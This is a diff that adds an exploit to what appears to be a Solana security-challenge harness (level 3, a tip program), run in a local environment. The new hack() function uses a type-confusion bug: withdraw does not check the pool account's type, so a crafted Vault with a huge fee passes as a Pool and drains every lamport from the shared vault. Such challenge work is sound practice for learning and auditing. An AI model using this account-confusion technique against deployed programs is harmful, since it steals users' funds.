@@ -24,7 +24,46 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+    // there's a shared vault storing all the lamports
+    // several pools can be created for the same vault and each pool tracks the .value in data
+
+    // withdraw does not check that the passed pool is a Pool struct, can pass an attacker Vault
+    // pool.withdraw_authority => vault.creator
+    // pool.vault => vault.fee_recipient
+    // pool.value => vault.fee
+    let seed: u8 = 1;
+    let hacker_vault = Pubkey::create_program_address(&[&[seed]], &_challenge.tip_program).unwrap();
+
+    // create hacker vault
+    let tx = _env.execute_as_transaction(
+        &[level3::initialize(
+            _challenge.tip_program, // tip_program: Pubkey,
+            hacker_vault, // vault_address: Pubkey,
+            _challenge.hacker.pubkey(), // initializer_address: Pubkey,
+            seed, // seed: u8,
+            u64::MAX as f64, // fee: f64,
+            _challenge.vault_address, // fee_recipient: Pubkey,
+        )],
+        &[&_challenge.hacker],
+    );
+    tx.print_named("Hack: vault creation");
+
+    // need to pass pool as fake vault
+    let withdraw_amount = _env.get_account(_challenge.vault_address).unwrap().lamports;
+
+    let tx = _env.execute_as_transaction(
+        &[level3::withdraw(
+            _challenge.tip_program, // tip_program: Pubkey,
+            _challenge.vault_address, // vault_address: Pubkey,
+            hacker_vault, // pool_address: Pubkey,
+            _challenge.hacker.pubkey(), // withdraw_authority: Pubkey,
+            withdraw_amount, // amount: u64,
+        )],
+        &[&_challenge.hacker],
+    );
+    tx.print_named("Hack: withdraw");
+}
 
 /*
 SETUP CODE BELOW
@@ -138,8 +177,8 @@ fn setup() -> (LocalEnvironment, Challenge, Internal) {
             vault_address,
             initizalizer.pubkey(),
             seed,
-            2.0,
-            vault_address,
+            2.0, // fee
+            vault_address, // fee recipient
         )],
         &[&initizalizer],
     ));
